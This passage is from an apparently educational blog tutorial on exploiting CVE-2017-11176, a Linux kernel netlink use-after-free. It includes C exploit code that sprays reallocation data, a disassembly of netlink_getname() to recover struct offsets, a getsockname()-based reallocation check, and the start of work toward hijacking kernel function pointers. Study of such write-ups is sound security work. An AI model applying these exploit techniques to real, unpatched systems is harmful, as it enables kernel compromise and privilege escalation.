<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">unblock_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] are we still alive ?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="c1">// TODO: exploit</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] exploit failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>You can run the exploit now but you won't see anything useful. We are still randomly crashing during <em>netlink_release()</em>. We will fix this in the next section.</p><hr><h1 id="exploit-arbitrary-call">Exploit (Arbitrary Call)</h1><p><em>"Where there is a will, there is way..."</em></p><p>In the previous sections, we:</p><ul><li>explained the basics of <em>reallocation</em> and <em>type confusion</em></li><li>gathered information about our own UAF and identified the dangling pointers</li><li>understood that we can trigger/control the UAF whenever we want</li><li>implemented the reallocation!</li></ul><p>It is time to put this all together and exploit the UAF. Keep in mind that:</p><p><strong>The ultimate goal is to take control over the <em>kernel execution flow</em>.</strong></p><p>What dictates the kernel execution flow? Like any other program, the instruction pointer: RIP (amd64) or PC (arm).</p><p>As we've seen in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">Core Concept #1</a>, the kernel is full of <em>Virtual Function Table (VFT)</em> and <strong>function pointers</strong> to achieve some genericity. Overwriting them and invoking them <strong>allows to control the flow of execution</strong> This is what we will do here.</p><hr><h2 id="the-primitive-gates">The Primitive Gates</h2><p>Let's get back to our <em>UAF primitives</em>. In a previous section, we saw that we can control (or trigger) the UAF by calling <strong>close(unblock_fd)</strong>. In addition, we saw that the <strong>sk</strong> field of <em>struct socket</em> is a dangling pointer. The relation between both are the VFTs:</p><ul><li><em>struct file_operations <strong>socket_file_ops</strong></em>: <em>close()</em> syscall to <em>sock_close()</em></li><li><em>struct proto_ops <strong>netlink_ops</strong></em>: <em>sock_close()</em> to <em>netlink_release()</em> (which uses <em>sk</em> intensively)</li></ul><p><strong>Those VFT are our primitive gates: every single <em>UAF primitive</em> starts from one of those function pointers.</strong></p><p>However, we can NOT control those pointers directly. The reason being that the free'd structure is <em>struct netlink_sock</em>. Instead, pointers to these VFTs are stored in <em>struct file</em> and <em>struct socket</em> respectively. We will exploit the primitive those VFTs offer.</p><p>For instance, let's look at <strong>netlink_getname()</strong> (from <em>netlink_ops</em>) which is reachable through the following (pretty straight forward) call trace:</p><div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">SYSCALL_DEFINE3</span><span class="p">(</span><span class="n">getsockname</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="c1">// calls sock-&gt;ops-&gt;getname()</span>
<span class="o">-</span><span class="w"> </span><span class="n">netlink_getname</span><span class="p">()</span><span class="w"></span>
</code></pre></div><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_getname</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="n">addr</span><span class="p">,</span><span class="w"></span>
<span class="w">               </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">addr_len</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">peer</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w">                                 </span><span class="c1">// &lt;----- DANGLING POINTER</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w">                      </span><span class="c1">// &lt;----- DANGLING POINTER</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="o">*</span><span class="n">nladdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">;</span><span class="w">    </span><span class="c1">// &lt;----- will be transmitted to userland</span>

<span class="w">    </span><span class="n">nladdr</span><span class="o">-&gt;</span><span class="n">nl_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">nladdr</span><span class="o">-&gt;</span><span class="n">nl_pad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="o">*</span><span class="n">addr_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">nladdr</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">peer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">                                                 </span><span class="c1">// &lt;----- set to zero by getsockname() syscall</span>
<span class="w">        </span><span class="n">nladdr</span><span class="o">-&gt;</span><span class="n">nl_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">dst_pid</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">nladdr</span><span class="o">-&gt;</span><span class="n">nl_groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_group_mask</span><span class="p">(</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">dst_group</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">nladdr</span><span class="o">-&gt;</span><span class="n">nl_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span><span class="w">                                </span><span class="c1">// &lt;----- uncontrolled read primitive</span>
<span class="w">        </span><span class="n">nladdr</span><span class="o">-&gt;</span><span class="n">nl_groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">groups</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">groups</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">     </span><span class="c1">// &lt;----- uncontrolled read primitive</span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p><strong>Wow! This is a nice "uncontrolled read primitive" (two reads and no side-effect). We will use it to improve the exploit reliability in order to detect if the reallocation succeeds.</strong></p><h2 id="reallocation-checker-implementation">Reallocation Checker Implementation</h2><p>Let's start playing with the previous primitive and check if the reallocation succeeds! How can we do this? Here is the plan:</p><ol><li>Find the <strong>exact offsets</strong> of <em>nlk-&gt;pid</em> and <em>nlk-&gt;groups</em></li><li>Write some magic value in our "reallocation data area" (i.e. <em>init_realloc_data()</em>)</li><li>Call <strong>getsockname()</strong> syscall and check the returned value.</li></ol><p>If the returned address matches our magic value, it means the reallocation worked and we have exploited our first <em>UAF primitive</em> (uncontrolled read)! You won't always have the luxury to validate if the reallocation worked or not.</p><p>In order to find the offsets of <em>nlk-&gt;pid</em> and <em>nlk-&gt;groups</em>, we first need to get the binary in an uncompressed format. If you don't know how to, check this <a href="https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/">link</a>. You should also take the <strong>"/boot/System.map-$(uname -r)"</strong> file. If (for some reasons) you don't have access to this file, you might try <strong>"/proc/kallsyms"</strong> which gives the same results (needs root access).</p><p>Alright, we are ready to disassemble our kernel. The Linux kernel is basically just an <strong>ELF binary</strong>. Hence, we can use classic <em>binutils</em> tools like <strong>objdump</strong>.</p><p>We want to find the <strong>exact offsets</strong> of <em>nlk-&gt;pid</em> and <em>nlk-&gt;groups</em> as they are used in the <strong>netlink_getname()</strong> function. Let's disassemble it! First, locate the address of <em>netlink_getname()</em> with the <em>System.map</em> file:</p><div class="highlight"><pre><span></span><code>$ grep <span class="s2">"netlink_getname"</span> System.map-2.6.32
ffffffff814b6ea0 t netlink_getname
</code></pre></div><p>In our case, the <em>netlink_getname()</em> function will be loaded at address <em>0xffffffff814b6ea0</em>.</p><p><strong>NOTE</strong>: We assume that KASLR is disabled.</p><p>Next, open the vmlinux (NOT vmlinuZ!), with a disassembly tool and let's analyze the <em>netlink_getname()</em> function:</p><div class="highlight"><pre><span></span><code>ffffffff814b6ea0:       55                      push   rbp
ffffffff814b6ea1:       48 89 e5                mov    rbp,rsp
ffffffff814b6ea4:       e8 97 3f b5 ff          call   0xffffffff8100ae40
ffffffff814b6ea9:       48 8b 47 38             mov    rax,QWORD PTR [rdi+0x38]
ffffffff814b6ead:       85 c9                   test   ecx,ecx
ffffffff814b6eaf:       66 c7 06 10 00          mov    WORD PTR [rsi],0x10
ffffffff814b6eb4:       66 c7 46 02 00 00       mov    WORD PTR [rsi+0x2],0x0
ffffffff814b6eba:       c7 02 0c 00 00 00       mov    DWORD PTR [rdx],0xc
ffffffff814b6ec0:       74 26                   je     0xffffffff814b6ee8
ffffffff814b6ec2:       8b 90 8c 02 00 00       mov    edx,DWORD PTR [rax+0x28c]
ffffffff814b6ec8:       89 56 04                mov    DWORD PTR [rsi+0x4],edx
ffffffff814b6ecb:       8b 88 90 02 00 00       mov    ecx,DWORD PTR [rax+0x290]
ffffffff814b6ed1:       31 c0                   xor    eax,eax
ffffffff814b6ed3:       85 c9                   test   ecx,ecx
ffffffff814b6ed5:       74 07                   je     0xffffffff814b6ede
ffffffff814b6ed7:       83 e9 01                sub    ecx,0x1
ffffffff814b6eda:       b0 01                   mov    al,0x1
ffffffff814b6edc:       d3 e0                   shl    eax,cl
ffffffff814b6ede:       89 46 08                mov    DWORD PTR [rsi+0x8],eax
ffffffff814b6ee1:       31 c0                   xor    eax,eax
ffffffff814b6ee3:       c9                      leave  
ffffffff814b6ee4:       c3                      ret    
ffffffff814b6ee5:       0f 1f 00                nop    DWORD PTR [rax]
ffffffff814b6ee8:       8b 90 88 02 00 00       mov    edx,DWORD PTR [rax+0x288]
ffffffff814b6eee:       89 56 04                mov    DWORD PTR [rsi+0x4],edx
ffffffff814b6ef1:       48 8b 90 a0 02 00 00    mov    rdx,QWORD PTR [rax+0x2a0]
ffffffff814b6ef8:       31 c0                   xor    eax,eax
ffffffff814b6efa:       48 85 d2                test   rdx,rdx
ffffffff814b6efd:       74 df                   je     0xffffffff814b6ede
ffffffff814b6eff:       8b 02                   mov    eax,DWORD PTR [rdx]
ffffffff814b6f01:       89 46 08                mov    DWORD PTR [rsi+0x8],eax
ffffffff814b6f04:       31 c0                   xor    eax,eax
ffffffff814b6f06:       c9                      leave  
ffffffff814b6f07:       c3                      ret    
</code></pre></div><p>Let's decompose the previous assembly in smaller chunk and match it to the original <em>netlink_getname()</em> function. If you do not remember the <strong>System V ABI</strong>, please check this <a href="https://wiki.osdev.org/System_V_ABI">link</a>. The most important thing to remember is the parameter order (we only have four parameters here):</p><ol><li><strong>rdi</strong>: <em>struct socket *sock</em></li><li><strong>rsi</strong>: <em>struct sockaddr *addr</em></li><li><strong>rdx</strong>: <em>int *addr_len</em></li><li><strong>rcx</strong>: <em>int peer</em></li></ol><p>Let's go. First we have the <em>prologue</em>. The call to <em>0xffffffff8100ae40</em> is a no-op (check the disassembly):</p><div class="highlight"><pre><span></span><code>ffffffff814b6ea0:       55                      push   rbp
ffffffff814b6ea1:       48 89 e5                mov    rbp,rsp
ffffffff814b6ea4:       e8 97 3f b5 ff          call   0xffffffff8100ae40   // &lt;---- NOP
</code></pre></div><p>Next, we have the <em>common</em> part of <em>netlink_getname()</em>, in ASM:</p><div class="highlight"><pre><span></span><code>ffffffff814b6ea9:       48 8b 47 38             mov    rax,QWORD PTR [rdi+0x38] // retrieve "sk"
ffffffff814b6ead:       85 c9                   test   ecx,ecx                  // test "peer" value
ffffffff814b6eaf:       66 c7 06 10 00          mov    WORD PTR [rsi],0x10      // set "AF_NETLINK"
ffffffff814b6eb4:       66 c7 46 02 00 00       mov    WORD PTR [rsi+0x2],0x0   // set "nl_pad"
ffffffff814b6eba:       c7 02 0c 00 00 00       mov    DWORD PTR [rdx],0xc      // sizeof(*nladdr)
</code></pre></div><p>The code then branches depending on the <em>peer</em> value:</p><div class="highlight"><pre><span></span><code>ffffffff814b6ec0:       74 26                   je     0xffffffff814b6ee8 // "if (peer)"
</code></pre></div><p>If "peer" is not zero (not our case), then there is all that code than we can mostly ignore except the last part:</p><div class="highlight"><pre><span></span><code>ffffffff814b6ec2:       8b 90 8c 02 00 00       mov    edx,DWORD PTR [rax+0x28c]    // ignore
ffffffff814b6ec8:       89 56 04                mov    DWORD PTR [rsi+0x4],edx      // ignore
ffffffff814b6ecb:       8b 88 90 02 00 00       mov    ecx,DWORD PTR [rax+0x290]    // ignore
ffffffff814b6ed1:       31 c0                   xor    eax,eax                      // ignore
ffffffff814b6ed3:       85 c9                   test   ecx,ecx                      // ignore
ffffffff814b6ed5:       74 07                   je     0xffffffff814b6ede           // ignore
ffffffff814b6ed7:       83 e9 01                sub    ecx,0x1                      // ignore
ffffffff814b6eda:       b0 01                   mov    al,0x1                       // ignore
ffffffff814b6edc:       d3 e0                   shl    eax,cl                       // ignore
ffffffff814b6ede:       89 46 08                mov    DWORD PTR [rsi+0x8],eax      // set "nladdr-&gt;nl_groups"
ffffffff814b6ee1:       31 c0                   xor    eax,eax                      // return code == 0
ffffffff814b6ee3:       c9                      leave  
ffffffff814b6ee4:       c3                      ret    
ffffffff814b6ee5:       0f 1f 00                nop    DWORD PTR [rax]
</code></pre></div><p>Which left us with this simple block, corresponding to the following code:</p><div class="highlight"><pre><span></span><code>ffffffff814b6ee8:       8b 90 88 02 00 00       mov    edx,DWORD PTR [rax+0x288]  // retrieve "nlk-&gt;pid"
ffffffff814b6eee:       89 56 04                mov    DWORD PTR [rsi+0x4],edx    // give it to "nladdr-&gt;nl_pid"
ffffffff814b6ef1:       48 8b 90 a0 02 00 00    mov    rdx,QWORD PTR [rax+0x2a0]  // retrieve "nlk-&gt;groups"
ffffffff814b6ef8:       31 c0                   xor    eax,eax
ffffffff814b6efa:       48 85 d2                test   rdx,rdx                    // test if "nlk-&gt;groups" it not NULL
ffffffff814b6efd:       74 df                   je     0xffffffff814b6ede         // if so, set "nl_groups" to zero
ffffffff814b6eff:       8b 02                   mov    eax,DWORD PTR [rdx]        // otherwise, deref first value of "nlk-&gt;groups"
ffffffff814b6f01:       89 46 08                mov    DWORD PTR [rsi+0x8],eax    // ...and put it into "nladdr-&gt;nl_groups"
ffffffff814b6f04:       31 c0                   xor    eax,eax                    // return code == 0
ffffffff814b6f06:       c9                      leave  
ffffffff814b6f07:       c3                      ret    
</code></pre></div><p>Alright, we have everything we need here:</p><ul><li><em>nlk-&gt;pid</em> <strong>offset is 0x288</strong> in "struct netlink_sock"</li><li><em>nlk-&gt;groups</em> <strong>offset is 0x2a0</strong> in "struct netlink_sock"</li></ul><p>In order to check that the reallocation succeeds, we will set the <strong>pid</strong> value to "0x11a5dcee" (arbitrary value) and the "groups" value to zero (otherwise it will be deferenced). Let's set those values into our <em>arbitrary data array</em> (i.e. <em>g_realloc_data</em>):</p><div class="highlight"><pre><span></span><code><span class="cp">#define MAGIC_NL_PID 0x11a5dcee</span>
<span class="cp">#define MAGIC_NL_GROUPS 0x0</span>

<span class="c1">// target specific offset</span>
<span class="cp">#define NLK_PID_OFFSET      0x288</span>
<span class="cp">#define NLK_GROUPS_OFFSET   0x2a0</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">init_realloc_data</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="w"> </span><span class="o">*</span><span class="n">first</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">int</span><span class="o">*</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_realloc_data</span><span class="p">[</span><span class="n">NLK_PID_OFFSET</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="o">**</span><span class="w"> </span><span class="n">groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_realloc_data</span><span class="p">[</span><span class="n">NLK_GROUPS_OFFSET</span><span class="p">];</span><span class="w"></span>

<span class="w">  </span><span class="n">memset</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">g_realloc_data</span><span class="p">,</span><span class="w"> </span><span class="sc">'A'</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">g_realloc_data</span><span class="p">));</span><span class="w"></span>

<span class="w">  </span><span class="c1">// necessary to pass checks in __scm_send()</span>
<span class="w">  </span><span class="n">first</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">g_realloc_data</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">g_realloc_data</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// must be different than SOL_SOCKET=1 to "skip" cmsg</span>
<span class="w">  </span><span class="n">first</span><span class="o">-&gt;</span><span class="n">cmsg_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="c1">// &lt;---- ARBITRARY VALUE</span>

<span class="w">  </span><span class="o">*</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAGIC_NL_PID</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="o">*</span><span class="n">groups</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAGIC_NL_GROUPS</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// TODO: do something useful will the remaining bytes (i.e. arbitrary call)</span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The reallocation data layout becomes:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/realloc_checker.png" title="Reallocation Checker Layout"><figcaption class="figcaption figure-caption text-center">realloc_checker</figcaption></figure><p></p><p>Then check, that we retrieve those values with <em>getsockname()</em> (i.e. <em>netlink_getname()</em>):</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="nf">check_realloc_succeed</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">magic_pid</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">magic_groups</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="n">addr</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">addr_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span><span class="w"></span>
<span class="w">  </span><span class="c1">// this will invoke "netlink_getname()" (uncontrolled read)</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_getsockname</span><span class="p">(</span><span class="n">sock_fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">addr_len</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] getsockname"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] addr_len = %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">addr_len</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] addr.nl_pid = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">.</span><span class="n">nl_pid</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] magic_pid = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">magic_pid</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">addr</span><span class="p">.</span><span class="n">nl_pid</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">magic_pid</span><span class="p">)</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] magic PID does not match!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">addr</span><span class="p">.</span><span class="n">nl_groups</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">magic_groups</span><span class="p">)</span><span class="w"> </span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] groups pointer does not match!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span><span class="w"></span>

<span class="nl">fail</span><span class="p">:</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Finally, invoke it in the <em>main()</em>:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">realloc_NOW</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">check_realloc_succeed</span><span class="p">(</span><span class="n">unblock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">MAGIC_NL_PID</span><span class="p">,</span><span class="w"> </span><span class="n">MAGIC_NL_GROUPS</span><span class="p">))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] reallocation failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="c1">// TODO: retry the exploit</span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] reallocation succeed! Have fun :-)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Now, re-launch the exploit. If the reallocation succeeds, you should see the message "[+] reallocation succeed! Have fun :-)". If not, then the reallocation has failed! You can try to handle the reallocation failure by retrying the exploit (warning: this will require more than just "relaunching it"). For now, we will just accept that we will crash...</p><p>In this section, we started doing <em>type confusion</em> with the <strong>pid</strong> field of our fake "netlink_sock" struct (i.e. from <em>g_realloc_data</em>). Also, we've seen how to trigger an <em>uncontrolled read primitive</em> with <strong>getsockname()</strong> which ends in <em>netlink_getname()</em>. Now that you are more familiar with UAF primitives, let's move on and get the arbitrary call!</p><h2 id="arbitrary-call-primitive">Arbitrary Call Primitive</h2><p>Alright, now you (hopefully) understood where our <em>UAF primitives</em> are and how to reach them (with file and/or socket-related syscalls). Note that we did not even considered the primitives brough by the other <em>dangling pointer</em>: hash list in <strong>nl_table</strong>. It is time to reach our goal: gain control over kernel execution flow.</p><p>Since we want to control the kernel execution flow, we need an <em>arbitrary call primitive</em>. As being said, we can have it by overwriting a function pointer. Does the <em>struct netlink_sock</em> structure hold any function pointer (FP)?</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="cm">/* struct sock has to be the first member of netlink_sock */</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w">     </span><span class="n">sk</span><span class="p">;</span><span class="w">                                 </span><span class="c1">// &lt;----- lots of (in)direct FPs</span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">pid</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">dst_pid</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">dst_group</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">flags</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">subscriptions</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">u32</span><span class="w">         </span><span class="n">ngroups</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">       </span><span class="o">*</span><span class="n">groups</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">       </span><span class="n">state</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">wait_queue_head_t</span><span class="w">   </span><span class="n">wait</span><span class="p">;</span><span class="w">                           </span><span class="c1">// &lt;----- indirect FP</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_callback</span><span class="w"> </span><span class="o">*</span><span class="n">cb</span><span class="p">;</span><span class="w">                      </span><span class="c1">// &lt;----- two FPs</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">mutex</span><span class="w">        </span><span class="o">*</span><span class="n">cb_mutex</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">mutex</span><span class="w">        </span><span class="n">cb_def_mutex</span><span class="p">;</span><span class="w"></span>
